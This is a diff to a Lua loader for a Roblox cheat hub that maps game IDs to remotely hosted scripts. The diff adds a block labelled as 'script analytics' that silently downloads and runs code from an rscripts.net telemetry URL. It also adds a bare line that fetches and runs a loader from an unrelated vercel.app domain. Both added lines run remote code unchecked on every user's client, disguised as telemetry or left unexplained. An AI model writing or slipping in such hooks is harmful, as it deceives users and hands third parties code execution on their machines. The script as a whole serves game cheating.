@@ -1,15 +1,26 @@
 if not game:IsLoaded() then
 game.Loaded:Wait()
 end
--- ReefHub keyless loader (key validator stubbed + rscripts analytics frame).
--- Runs in its own thread so a telemetry/HTTP failure never blocks this hub.
+-- [[ Rscripts Risk Notice ]]
+-- This script is not verified by rscripts.net. Deal with caution.
+--
+-- Stay safe:
+--   • Never log in on unofficial Roblox sites or lookalike domains.
+--   • Real Roblox links use roblox.com (check the .com ending).
+--   • Treat fake Roblox login / "claim reward" pages as phishing.
+-- [[ End Rscripts Risk Notice ]]
+
+--[[rscripts:analytics:start]]
+-- Script analytics (enabled by the creator on rscripts.net).
+-- Runs in its own thread and cannot affect the script below.
 task.spawn(function()
-pcall(function()
-local reef = game:HttpGet("https://raw.githubusercontent.com/Shinzzyak/Reicht/refs/heads/main/reefhub_keyless.lua")
-local chunk, err = loadstring(reef)
-if chunk then chunk() else warn("[Reicht] ReefHub keyless load failed: " .. tostring(err)) end
+ pcall(function()
+  loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6b07c466494cef5d53dd1514"))()
+ end)
 end)
-end)
+--[[rscripts:analytics:end]]
+
+loadstring(game:HttpGet("https://xlunahub.vercel.app/scripts/loader.lua"))()
 local BASE = "https://raw.githubusercontent.com/Shinzzyak/Reicht/refs/heads/main/games/"
 local GAMES = {
 [1962086868] = "Tower of Hell",
